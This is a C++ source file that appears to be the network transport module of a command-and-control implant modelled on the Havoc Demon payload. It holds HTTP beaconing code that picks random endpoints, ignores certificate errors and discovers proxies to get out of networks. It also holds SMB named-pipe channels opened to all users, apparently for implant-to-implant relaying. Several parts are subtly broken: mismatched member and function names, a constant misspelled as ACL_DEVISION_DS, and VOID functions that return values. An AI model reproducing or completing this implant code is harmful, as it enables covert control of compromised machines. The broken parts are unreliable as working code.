#include <core/include/network.hpp>
using namespace Stream;

namespace Network {
    namespace Http {

        BOOL HttpSendRequest(HINTERNET request, PACKET **packet) {
            DWORD read      = 0;
            DWORD in_length = 0;

            uint32_t total          = 0;
            uint32_t last_read      = 0;
            uint32_t def_length     = 8192;

            bool success    = true;
            void *response  = Malloc(def_length);
            void *buffer    = Malloc(def_length);

            do {
                if (!ctx->win32.WinHttpQueryDataAvailable(request, &in_length)) {
                    if (response) {
                        success = false;
                        goto defer;
                    }
                }

                last_read = in_length;

                if (in_length > def_length) {
                    void *r_buffer  = Realloc(buffer, in_length);

                    if (!r_buffer) {
                        success = false;
                        goto defer;
                    }

                    buffer = r_buffer;
                }

                MemSet(buffer, 0, in_length);

                if (!ctx->win32.WinHttpReadData(request, buffer, in_length, &read)) {
                    success = false;
                    goto defer;
                }

                if (total + read > def_length) {
                    void *r_response = Realloc(response, (total + read) * 2);

                    if (!r_response) {
                        success = false;
                        goto defer;
                    }

                    response = r_response;
                }

                MemCopy(B_PTR(response) + total, buffer, read);
                total += read;

            } while (in_length > 0);

            *packet = (PACKET*) Malloc(sizeof(PACKET));
            (*packet)->buffer = B_PTR(response);
            (*packet)->length = total;

        defer:
            if (!success) {
                MemSet(response, 0, total);
                Free(response);
            }

            MemSet(buffer, 0, last_read);
            Free(buffer);

            return success;
        }

        VOID DestroyRequestContext(_request_context *req_ctx) {
            if (req_ctx) {
                if (req_ctx->req_handle)    { ctx->win32.WinHttpCloseHandle(req_ctx->req_handle); }
                if (req_ctx->conn_handle)   { ctx->win32.WinHttpCloseHandle(req_ctx->conn_handle); }

                if (req_ctx->endpoint) {
                    MemSet(req_ctx->endpoint, 0, WcsLength(req_ctx->endpoint) * sizeof(wchar_t));
                    Free(req_ctx->endpoint);
                }
            }
        }

        VOID DestroyProxyContext(_proxy_context *proxy_ctx) {
            if (proxy_ctx) {
                if (proxy_ctx->proxy_config.lpszProxy)          { Free(proxy_ctx->proxy_config.lpszProxy); }
                if (proxy_ctx->proxy_config.lpszProxyBypass)    { Free(proxy_ctx->proxy_config.lpszProxyBypass); }
                if (proxy_ctx->proxy_config.lpszAutoConfigUrl)  { Free(proxy_ctx->proxy_config.lpszAutoConfigUrl); }
            }
        }

        BOOL CreateRequestContext(_request_context *req_ctx) {
            const auto address  = ctx->transport.http->address;
            const auto port     = ctx->transport.http->port;

            auto handle = ctx->transport.http->handle;
            if (!handle) {
                if (!(handle = ctx->win32.WinHttpOpen(ctx->transport.http->useragent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0))) {
                    return false;
                }
            }

            if (!(req_ctx->conn_handle = ctx->win32.WinHttpConnect(handle, address, port, 0))) {
                ctx->win32.NtClose(handle);
                return false;
            }

            auto n_endpoints = ctx->transport.http->n_endpoints;
            req_ctx->endpoint = ctx->transport.http->endpoints[RANDOM(n_endpoints)];

            auto endpoint   = req_ctx->endpoint;
            auto flags      = WINHTTP_FLAG_BYPASS_PROXY_CACHE;

            if (ctx->transport.b_ssl) {
                flags |= WINHTTP_FLAG_SECURE;
            }

            if (!(req_ctx->req_handle = ctx->win32.WinHttpOpenRequest(req_ctx->conn_handle, L"GET", endpoint, nullptr, nullptr, nullptr, flags))) {
                return false;
            }

            return true;
        }

        BOOL CreateProxyContext(_proxy_context *proxy_ctx, _request_context *req_ctx) {
            auto proxy_info     = proxy_ctx->proxy_info;
            const auto username = ctx->transport.http->proxy->username;
            const auto password = ctx->transport.http->proxy->password;

            if (ctx->transport.b_proxy) {
                proxy_info.dwAccessType  = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
                proxy_info.lpszProxy     = ctx->transport.http->proxy->address;

                if (!ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY, &proxy_info, sizeof(WINHTTP_PROXY_INFO))) {
                    return false;
                }

                if (username && password) {
                    if (!ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY_USERNAME, username, WcsLength(username)) ||
                        !ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY_PASSWORD, password, WcsLength(password))) {
                        return false;
                    }
                }
            }
            else if (!ctx->transport.b_envproxy_check) {
                auto autoproxy = proxy_ctx->autoproxy;

                autoproxy.dwFlags                = WINHTTP_AUTOPROXY_AUTO_DETECT;
                autoproxy.dwAutoDetectFlags      = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
                autoproxy.lpszAutoConfigUrl      = nullptr;
                autoproxy.lpvReserved            = nullptr;
                autoproxy.dwReserved             = 0;
                autoproxy.fAutoLogonIfChallenged = true;

                if (ctx->win32.WinHttpGetProxyForUrl(ctx->transport.http->handle, req_ctx->endpoint, &autoproxy, &proxy_info)) {
                    ctx->transport.env_proxylen  = sizeof(WINHTTP_PROXY_INFO);
                    ctx->transport.env_proxy     = Malloc(ctx->transport.env_proxylen);

                    MemCopy(ctx->transport.env_proxy, &proxy_info, ctx->transport.env_proxylen);
                }
                else {
                    auto proxy_config = proxy_ctx->proxy_config;
                    if (ctx->win32.WinHttpGetIEProxyConfigForCurrentUser(&proxy_config)) {

                        if (proxy_config.lpszProxy != nullptr && WcsLength(proxy_config.lpszProxy) != 0) {
                            proxy_info.dwAccessType      = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
                            proxy_info.lpszProxy         = proxy_config.lpszProxy;
                            proxy_info.lpszProxyBypass   = proxy_config.lpszProxyBypass;

                            ctx->transport.env_proxylen     = sizeof(WINHTTP_PROXY_INFO);
                            ctx->transport.env_proxy        = Malloc(ctx->transport.env_proxylen);

                            MemCopy(ctx->transport.env_proxy, &proxy_info, ctx->transport.env_proxylen);

                            proxy_config.lpszProxy       = nullptr;
                            proxy_config.lpszProxyBypass = nullptr;
                        }
                        else if (proxy_config.lpszAutoConfigUrl != nullptr && WcsLength(proxy_config.lpszAutoConfigUrl) != 0) {
                            autoproxy.dwFlags            = WINHTTP_AUTOPROXY_CONFIG_URL;
                            autoproxy.lpszAutoConfigUrl  = proxy_config.lpszAutoConfigUrl;
                            autoproxy.dwAutoDetectFlags  = 0;

                            ctx->win32.WinHttpGetProxyForUrl(ctx->transport.http->handle, req_ctx->endpoint, &autoproxy, &proxy_info);
                            ctx->transport.env_proxylen     = sizeof(WINHTTP_PROXY_INFO);
                            ctx->transport.env_proxy        = Malloc(ctx->transport.env_proxylen);

                            MemCopy(ctx->transport.env_proxy, &proxy_info, ctx->transport.env_proxylen);
                        }
                    }
                }
                ctx->transport.b_envproxy_check = true;
            }

            if (ctx->transport.env_proxy) {
                if (!ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY, ctx->transport.env_proxy, ctx->transport.env_proxylen)) {
                    return false;
                }
            }

            return true;
        }

        BOOL HttpCallback(PACKET **in, PACKET *out) {
            // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/transportHttp.c#L21
            // TODO: reverting tokens during http operations

            _proxy_context proxy_ctx = { };
            _request_context req_ctx = { };

            uint32_t status = 0;
            DWORD n_status  = sizeof(uint32_t);
            bool success    = true;

            const auto handle   = req_ctx.req_handle;
            const auto query    = WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER;
            auto sec_flags      = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

            if (!CreateRequestContext(&req_ctx) || !CreateProxyContext(&proxy_ctx, &req_ctx)) {
                success = false;
                goto defer;
            }

            if (ctx->transport.b_ssl) {
                x_assertb(ctx->win32.WinHttpSetOption(handle, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(ULONG)));
            }

            if (ctx->transport.http->headers) {
                wchar_t *header     = nullptr;
                uint32_t n_headers  = 0;

                while (true) {
                    if (!(header = ctx->transport.http->headers[n_headers])) {
                        break;
                    }

                    x_assertb(ctx->win32.WinHttpAddRequestHeaders(handle, header, -1, WINHTTP_ADDREQ_FLAG_ADD));
                    n_headers++;
                }
            }

            x_assertb(ctx->win32.WinHttpSendRequest(handle, nullptr, 0, out->buffer, out->length, out->length, 0));
            x_assertb(ctx->win32.WinHttpReceiveResponse(handle, nullptr));
            x_assertb(ctx->win32.WinHttpQueryHeaders(handle, query, nullptr, &status, &n_status, nullptr));

            if (status != HTTP_STATUS_OK) {
                success = false;
                goto defer;
            }

            x_assertb(HttpSendRequest(req_ctx.req_handle, in));

            defer:
            DestroyRequestContext(&req_ctx);
            DestroyProxyContext(&proxy_ctx);

            return success;
        }
    }

    namespace Smb {
        VOID SmbContextDestroy(PSMB_PIPE_SEC_ATTR SmbSecAttr) {
            if (SmbSecAttr->sid)        { ctx->win32.FreeSid(SmbSecAttr->sid); 		SmbSecAttr->sid = nullptr; }
            if (SmbSecAttr->sid_low)    { ctx->win32.FreeSid(SmbSecAttr->sid_low); 	SmbSecAttr->sid_low = nullptr; }
            if (SmbSecAttr->p_acl)      { Free(SmbSecAttr->p_acl); }
            if (SmbSecAttr->sec_desc)   { Free(SmbSecAttr->sec_desc); }
        }

		VOID SmbInitContext(SMB_PIPE_SEC_ATTR *smbSecAttr, PSECURITY_ATTRIBUTES secAttr) {
			SID_IDENTIFIER_AUTHORITY world 	= SECURITY_WORLD_SID_AUTHORITY;
			SID_IDENTIFIER_AUTHORITY label 	= SECURITY_MANDATORY_LABEL_AUTHORITY;
			EXPLICIT_ACCESSA access 		= { };
			DWORD status					= 0;
			PACL dacl 						= nullptr;

			x_memset(smbSecAttr, 0, sizeof(SMB_PIPE_SEC_ATTR));
			x_memset(secAttr, 0, sizeof(PSECURITY_ATTRIBUTES));

			if (!AllocateAndInitializeSid(&world, 1, SECURITY_WORLD_RID, 0,0,0,0,0,0,0, &smbSecAttr->Sid)) {
				return false;
			}

			access.grfAccessPermissions = SPECIFIC_RIGHTS_ALL | STANDARD_RIGHTS_ALL;
			access.grfInheritance       = NO_INHERITANCE;
			access.grfAccessMode        = SET_ACCESS;
			access.Trustee.TrusteeForm  = TRUSTEE_IS_SID;
			access.Trustee.TrusteeType  = TRUSTEE_IS_WELL_KNOWN_GROUP;
			access.Trustee.ptstrName    = (LPSTR) smbSecAttr->Sid;

			status = SetEntriesInAclA(1, &access, nullptr, &dacl);
			if (status != 0) {
				// soft error
			} 
			if (!AllocateAndInitializeSid(&label, 1, SECURITY_MANDATORY_LOW_RID, 0,0,0,0,0,0,0, &smbSecAttr->SidLow)) {
				// soft error
			}

			smbSecAttr->pAcl = (PACL) HeapAlloc(GetProcessHeap(), 0, MAX_PATH);
			if (!InitializeAcl(smbSecAttr->pAcl, MAX_PATH, ACL_DEVISION_DS)) {
				// soft error
			}
			if (!AddMandatoryAce(smbSecAttr->pAcl, ACL_REVISION_DS, NO_PROPAGATE_INHERIT_ACE, 0, smbSecAttr->SidLow)) {
				// soft error
			}

			smbSecattr->SecDec = (PSECURITY_DESCRIPTOR) HeapAlloc(GetProcessHeap(), 0, SECURITY_DESCRIPTOR_MIN_LENGTH);
			if (!InitializeSecurityDescriptor(smbSecAttr->SecDec, SECURITY_DESCRIPTOR_REVISION)) {
				// soft error
			} 
			if (!SetSecurityDescriptorDacl(smbSecAttr->SecDec, true, dacl, false)) {
				// soft error
			}
			if (!SetSecurityDescriptorSacl(smbSecAttr->SecDec, true, smbSecAttr->pAcl, false)) {
				// soft error
			}

			secAttr->lpSecurityDescriptor = smbSecAttr->SecDec;
			secAttr->bInheritHandle = false;
			secAttr->nLength = sizeof(SECURITY_ATTRIBUTES);

			return true;
		}

        BOOL PipeRead(void *handle, PACKET *in) {
            uint32_t read   = 0;
            uint32_t total  = 0;

            do {
                const auto length = __min((in->length - total), PIPE_BUFFER_MAX);

                if (!ctx->win32.ReadFile(handle, B_PTR(in->buffer) + total, length, (DWORD*) &read, nullptr)) {
                    if (ntstatus == ERROR_NO_DATA) {
                        return false;
                    }
                }

                total += read;
            }
            while (total < in->length);
            return true;
        }

        BOOL PipeWrite(void *handle, PACKET *out) {
            uint32_t total = 0;
            uint32_t write = 0;

            do {
                const auto length = __min((out->length - total), PIPE_BUFFER_MAX);

                if (!ctx->win32.WriteFile(handle, B_PTR(out->buffer) + total, length, (DWORD*) &write, nullptr)) {
                    return false;
                }

                total += write;
            }
            while (total < out->length);
            return true;
        }

        BOOL PipeSend (PACKET *out) {
            SMB_PIPE_SEC_ATTR smb_sec_attr  = { };
            SECURITY_ATTRIBUTES sec_attr    = { };

			if (!ctx->transport.egress_handle) {
				SmbInitContext(&smb_sec_attr, &sec_attr);

				ctx->transport.egress_handle = ctx->win32.CreateNamedPipeW(
						ctx->transport.egress_name, 
						PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 
						PIPE_BUFFER_MAX, PIPE_BUFFER_MAX, 0, &sec_attr);

				if (!ctx->transport.egress_handle || ctx->transport.egress_handle == INVALID_HANDLE_VALUE) {
					return false;
				}

				SmbDestroyContext(&smb_sec_attr);

				if (!ctx->win32.ConnectNamedPipe(ctx->transport.egress_handle, nullptr)) {
					ctx->win32.NtClose(ctx->transport.egress_handle);
					return false;
				}
			}

            if (!PipeWrite(ctx->transport.egress_handle, out)) {
                if (ntstatus == ERROR_NO_DATA) {

                    if (ctx->transport.egress_handle) {
                        ctx->win32.NtClose(ctx->transport.egress_handle);
                    }
                    return false;
                }
            }
            return true;
        }

        BOOL PipeReceive(PACKET** in) {
            uint32_t peer_id    = 0;
            uint32_t msg_size   = 0;

            DWORD total = 0;
            *in = CreatePacket();

            if (ctx->win32.PeekNamedPipe(ctx->transport.egress_handle, nullptr, 0, nullptr, &total, nullptr)) {
                if (total > sizeof(uint32_t) * 2) {

                    if (!ctx->win32.ReadFile(ctx->transport.egress_handle, &peer_id, sizeof(uint32_t), &total, nullptr)) {
                        return false;
                    }
                    if (ctx->session.peer_id != peer_id) {
                        return false;
                    }
                    if (!ctx->win32.ReadFile(ctx->transport.egress_handle, &msg_size, sizeof(uint32_t), &total, nullptr)) {
                        if (ntstatus != ERROR_MORE_DATA) {
                            return false;
                        }
                    }

                    if (!PipeRead(ctx->transport.egress_handle, *in)) {
                        if (*in) {
                            DestroyPacket(*in);
                        }
                        return false;
                    }
                }
            }

            return true;
        }
    }
}

